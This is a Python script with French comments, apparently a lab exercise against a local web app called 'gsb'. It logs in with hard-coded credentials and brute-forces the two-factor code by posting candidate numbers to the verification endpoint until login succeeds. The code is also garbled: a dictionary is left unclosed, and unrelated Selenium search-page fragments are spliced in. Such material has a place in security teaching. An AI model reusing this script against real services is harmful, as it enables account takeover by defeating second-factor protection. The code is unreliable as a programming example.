
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

# Créer une session Google
driver = webdriver.Chrome()

from requests_html import HTMLSession

# Identifiants connus
identifiants = {
    'login': 'dandre',
    'mdp': 'oppg5'

#appeler l'application web
driver.get("http://gsb/index.php?uc=connexion&action=valideConnexion")

# Localiser la zone de texte
search_field = driver.find_element_by_id("code")


# Saisir et confirmer le mot-clé
search_field.send_keys("Mot-clé")
search_field.submit()


# Consulter la liste des résultats affichés à la suite de la recherche
# à l’aide de la méthode find_elements_by_class_name
lists= driver.find_elements_by_class_name("_Rm")

'''
from requests_html import HTMLSession


# Identifiants connus
identifiants = {
    'login': 'dandre',
    'mdp': 'oppg5'
}
'''
# On utilise HTMLSession avec with pour une fermeture auto à la fin de la structure
with HTMLSession() as s:
    # On se connecte au site avec les identifiants connus
    p = s.post('http://gsb/index.php?uc=connexion&action=valideConnexion', data=identifiants)
    # On va boucler sur autant de possibilité de clé que possible
    for i in range(1000, 1006):
        code = {
            'code': i
        }
        # On teste le code
        p = s.post('http://gsb/index.php?uc=connexion&action=valideA2fConnexion', data=code)
        # On essaye de récupérer la page d'accueil
        r = s.get('http://gsb/index.php', data=code)
        titre = r.html.find('h3', first=True)
        # Est-ce que l'on est connecté ?
        if titre.text != "Identification utilisateur":
            print(r.text)
            print("Le code est : ",i)
            search_btn = driver.find_element_by_class_name("btn btn-lg btn-success btn-block")
            search_btn.click()
            # On s'arrête lorsque c'est trouvé !
            break

# Fermer la fenêtre du navigateur
driver.quit()